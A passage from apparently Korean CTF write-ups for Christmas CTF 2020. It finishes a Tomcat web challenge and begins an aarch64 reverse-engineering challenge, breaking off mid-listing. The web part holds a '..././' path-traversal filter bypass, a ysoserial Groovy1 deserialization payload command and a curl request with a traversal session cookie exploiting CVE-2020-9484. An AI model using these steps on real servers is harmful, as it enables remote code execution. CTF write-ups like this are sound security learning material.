위에서 확인한 두 개의 폴더가 나옵니다. 더 위로 올라가 봅시다.</p><p><code>../</code>나 <code>....//</code>은 필터링이 되어 있어 디렉터리 리스팅이 불가능하지만 <code>..././</code>은 가능합니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png"></p><p>해당 폴더에 진입하면 gift 폴더 안에서 username으로 gift list가 관리되고 있음을 알 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png"></p><p>한 번 더 올라가면 이러한 디렉터리가 보입니다. tomcat의 상위 디렉터리인데 이를 통해 tomcat을 통해 구동되고 있음을 확인할 수 있습니다. 먼저 웹페이지 소스코드 파일은 webapps에 들어있으므로 해당 디렉터리를 들어가서 어떠한 파일이 있는지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png"></p><p><code>special.jsp</code>라는 파일이 있네요. 메인에서 special gift가 숨겨져 있다고 했으니 해당 jsp를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png"></p><p><code>special_gift</code> 파일을 찾아서 실행하면 이 디렉터리에서 특별한 선물을 볼 수 있다고 합니다.</p><p>tomcat 디렉터리로 가서 RELEASE-NOTES의 내용을 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png"></p><p>tomcat-8.5.54 버전에서 동작하고 있습니다. 해당 버전은 CVE-2020-9484 버전에 영향을 받는 버전이고 해당 취약점에 영향을 받는지 확인하는 방법은 아래와 같습니다.</p><ul><li>tomcat이 session을 PersistenceManager를 통해 세션을 관리함</li><li>FileStore를 통해 Directory 경로를 지정함</li><li>arbitrary file upload가 가능하며 해당 파일이 어디에 저장되는지 알 수 있음</li></ul><p>현재 arbitrary file upload가 가능하며 파일이 업로드되는 위치도 알 수 있으므로 <code>conf/context.xml</code>을 통해 PersistenceManager를 사용 중인지, 사용 중이라면 FileStore로 Directory를 지정해서 저장하는지, 저장한다면 session이 저장되는 경로는 어딘지 확인합시다.(아까 위에서 sessions 폴더를 본 것 같긴 한데)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>로 접근하면 <code>conf/context.xml</code>의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png"></p><p>PersistentManager, FileStore를 사용하며 session이 저장되는 경로는 <code>/usr/local/tomcat/sessions</code>네요.</p><p>해당 취약점은 session을 deserialize 하면서 일어나는 취약점이므로 gadget도 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png"></p><p><code>/lib</code> 폴더에 <code>groovy-2.3.9.jar</code> 가 존재하는 것을 알 수 있습니다.</p><p>이제 <code>special_gift</code> 파일의 위치를 찾아보면</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png"></p><p>최상위 경로에 있는 것을 볼 수 있습니다.(이것도 위치를 알려줬어야…ㅠㅠ) 이제 해당 취약점을 활용하여 <code>special_gift</code> 바이너리를 실행하면 <code>/webapps/ROOT</code> 에 flag 파일이 생성될 것입니다.</p><p>그전에 해당 취약점을 활용하는 것이 맞는지 upload.jsp의 내용으로 올릴 수 있는 special file이 session 파일인지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png"></p><p>허용되어있는 확장자가 <code>.txt</code>와 <code>.session</code>파일임을 알 수 있습니다!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png"></p><p>흠.. 일단 exploit 과정을 정리하면 다음과 같습니다.</p><ul><li>file이 업로드되는 경로는 <code>tomcat/media/gift/&lt;name&gt;</code>이다.</li><li>sessions이 저장되는 경로는 <code>tomcat/sessions</code>이다.</li><li><code>special.jsp</code> 에 따르면 <code>/special_gift</code>를 실행하면 flag 파일이 생성된다.</li><li><code>/bin/bash -c /special_gift</code>를 수행하면 <code>special_gift</code> 파일이 실행되고 flag를 확인할 수 있다.</li><li>serialize session 생성</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>해당 session file으로 접근</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png"></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>web</tag>
      
      <tag>lfi</tag>
      
      <tag>cve-2020-9484</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - lock</title>
    <link href="/2020/12/29/idioth/christmasctf2020-lock/"/>
    <url>/2020/12/29/idioth/christmasctf2020-lock/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dump로 파일이 하나 주어지며 vscode나 메모장 등으로 열면 아래와 같은 dump 코드가 나옵니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png"></p><p>aarch64에서 동작하는 바이너리이며 Input 값을 통해 어떠한 연산을 수행하는 것으로 볼 수 있습니다.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>                    // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span>                   // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span>              // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#x27;<span class="hljs-symbol">%s</span>&#x27; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   <span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>                    // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main 함수를 보면 <code>sp + #16</code>에 calloc(0x13,1)을 해주고 <code>sub_ab8</code>함수가 호출된 후 나온 값을 인자로 <code>sub_9b0</code> 함수가 실행된 후 <code>sp + #24</code>에 저장합니다. 그 후 <code>sub_96c</code> 함수를 호출하고 값을 받아서<code>sp+#16</code>에 넣어주고  <code>sub_9b0(sub_ab8())</code> 한 값과 input 값을 인자로 <code>sub_b30</code> 함수를 호출하고 프로그램이 종료됩니다. 해당 함수를 c 코드로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>sub_ab8</code>과 <code>sub_9b0</code> 함수를 살펴봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8                    // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e                   // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64의 calling convention은 <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> 이므로 인자에 value1, 0x3e, value0, 0x8을 넣어 <code>sub_9fc</code>를 호출합니다. 호출하고 난 후 연산된 문자열을 return 해줍니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>                // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>에서 반환한 문자열을 받아서 길이를 계산한 후 <code>malloc</code> 해줍니다. 할당한 주소가 0이라면 0을 반환해주고, 아니면 <code>strcpy</code>를 통해 <code>sub_ab8</code>에서 온 문자열을 복사하여 return 해줍니다.</p><p>이제 <code>sub_9fc</code> 함수를 분석을 해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span 